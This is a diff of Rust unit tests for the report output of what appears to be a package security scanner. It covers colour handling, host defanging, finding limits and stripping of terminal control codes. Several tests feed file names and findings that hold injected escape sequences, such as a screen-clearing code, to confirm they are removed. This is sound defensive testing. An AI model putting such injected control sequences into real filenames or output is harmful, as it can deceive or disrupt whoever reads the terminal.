+        let shown = plain(&report);
+
+        assert!(shown.contains("axios(config.url)"));
+        assert!(shown.contains("node install.js"));
     }
 
     #[test]
@@ -408,12 +1097,71 @@ mod tests {
             at(&file, 1),
         );
         report.add(Kind::CallWithoutAddress, "", "fetch(\x1b[2J)", at(&file, 2));
-        report.add(Kind::NotRead, "", "link\x1b[2J: not a regular file", None);
+        report.add_detail(Kind::NotRead, "link\x1b[2J", "not a \x1b[31mregular file");
 
-        let shown = report.to_string();
+        for palette in [&PLAIN, &COLOR] {
+            let shown = strip_palette_codes(&report.render(&info(), palette));
 
-        assert!(!shown.contains('\x1b') && !shown.contains('\x07'));
-        assert!(!shown.lines().any(|line| line.starts_with("verdict")));
+            assert!(!shown.contains('\x1b') && !shown.contains('\x07'));
+            assert!(!shown.lines().any(|line| line.starts_with("verdict")));
+        }
+    }
+
+    #[test]
+    fn plain_output_has_no_color_codes() {
+        let file = path("a.js");
+        let mut report = Report::new();
+        report.add(Kind::KnownMalicious, "", "bad 1.0 (npm)", at(&file, 1));
+
+        assert!(!plain(&report).contains('\x1b'));
+    }
+
+    #[test]
+    fn color_output_has_the_same_text_as_plain_output_apart_from_the_alarm_padding() {
+        let file = path("a.js");
+        let mut report = Report::new();
+        report.add(Kind::KnownMalicious, "", "bad 1.0 (npm)", at(&file, 1));
+        report.add(
+            Kind::NetworkCall,
+            "h.example",
+            "https://h.example",
+            at(&file, 2),
+        );
+
+        let colored = strip_palette_codes(&report.render(&info(), &COLOR));
+
+        for needle in [
+            "bad 1.0 (npm)",
+            "h[.]example",
+            "DANGER: 1 dangerous finding",
+            "a.js:2",
+        ] {
+            assert!(colored.contains(needle), "missing: {needle}");
+        }
+        assert!(colored.contains(" DANGER  Known malicious package"));
+    }
+
+    #[test]
+    fn only_uses_color_where_it_will_display_properly() {
+        // Output going to a file or program.
+        assert!(!wants_color(false, false, Some("xterm"), false, false));
+        // The NO_COLOR convention.
+        assert!(!wants_color(true, true, Some("xterm"), false, false));
+        // Terminals that can't show it.
+        assert!(!wants_color(true, false, Some("dumb"), false, false));
+        assert!(!wants_color(true, false, None, false, false));
+        // Normal Linux and macOS terminals.
+        assert!(wants_color(
+            true,
+            false,
+            Some("xterm-256color"),
+            false,
+            false
+        ));
+        assert!(wants_color(true, false, Some("linux"), false, false));
+        // An old Windows console, and Windows Terminal.
+        assert!(!wants_color(true, false, None, true, false));
+        assert!(wants_color(true, false, None, true, true));
     }
 
     #[test]
@@ -427,7 +1175,7 @@ mod tests {
             at(&file, 1),
         );
 
-        assert!(report.to_string().contains("look-alikes"));
+        assert!(plain(&report).contains("look-alikes"));
     }
 
     #[test]
@@ -439,7 +1187,7 @@ mod tests {
             report.add(Kind::MentionedAddress, "", &url, at(&file, 1));
         }
 
-        let shown = report.to_string();
+        let shown = plain(&report);
 
         assert!(report.not_listed > 0);
         assert!(shown.contains("This list is incomplete"));
@@ -451,14 +1199,33 @@ mod tests {
         let mut report = Report::new();
         report.note_not_listed(7);
 
-        assert!(report.to_string().contains("7 more items"));
+        assert!(plain(&report).contains("7 more items"));
     }
 
     #[test]
-    fn always_states_that_this_is_not_a_verdict() {
-        let shown = Report::new().to_string();
+    fn remembers_network_calls_per_file_within_a_limit() {
+        let mut report = Report::new();
+        let call = Call {
+            group: "h".to_string(),
+            subject: "https://h/x".to_string(),
+            line: Some(3),
+        };
+        for _ in 0..MAX_CALLS_PER_FILE + 5 {
+            report.record_call("a.js", call.clone());
+        }
 
-        assert!(shown.contains("not a safety verdict"));
-        assert!(shown.contains("Only addresses written as plain text"));
+        assert_eq!(report.calls_in("a.js").len(), MAX_CALLS_PER_FILE);
+        assert_eq!(report.calls_in("a.js")[0], call);
+        assert!(report.calls_in("b.js").is_empty());
+    }
+
+    #[test]
+    fn knows_whether_anything_was_found() {
+        let file = path("a.js");
+        let mut report = Report::new();
+        assert!(!report.has_findings());
+
+        report.add(Kind::DocumentationAddress, "", "x", at(&file, 1));
+        assert!(report.has_findings());
     }
 }
